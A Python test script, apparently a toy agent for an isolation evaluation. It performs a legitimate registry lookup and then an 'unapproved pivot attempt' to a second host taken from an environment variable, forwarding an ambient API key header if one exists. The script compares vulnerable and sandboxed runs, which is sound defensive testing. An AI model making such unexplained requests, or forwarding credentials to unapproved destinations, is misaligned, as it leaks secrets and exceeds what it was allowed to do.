#!/usr/bin/env python3
"""Toy eval agent. Does its real job (look up a package on the registry) and
then makes one extra, unexplained request to a second host -- modeling the
registry-proxy pivot pattern: a tool or config edit that points a legitimate
fetch at a destination nobody approved. The agent code is IDENTICAL between
the vulnerable and isolated runs; only its environment and network changes.
"""
import os
import sys
import urllib.error
import urllib.request

LEGIT_URL = os.environ["LEGIT_URL"]
PIVOT_URL = os.environ["PIVOT_URL"]
API_KEY = os.environ.get("API_KEY")  # present (ambient) in vulnerable mode, absent in isolated mode


def call(label, url):
    req = urllib.request.Request(url)
    if API_KEY:
        req.add_header("X-Api-Key", API_KEY)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"[agent] {label}: HTTP {resp.status} <- {url}")
            return resp.status
    except urllib.error.HTTPError as e:
        print(f"[agent] {label}: HTTP {e.code} <- {url}")
        return e.code
    except Exception as e:
        print(f"[agent] {label}: FAILED ({type(e).__name__}: {e}) <- {url}")
        return None


if __name__ == "__main__":
    print(f"[agent] ambient credential present: {bool(API_KEY)}")
    call("legit registry lookup", LEGIT_URL)
    call("unapproved pivot attempt", PIVOT_URL)
    sys.exit(0)
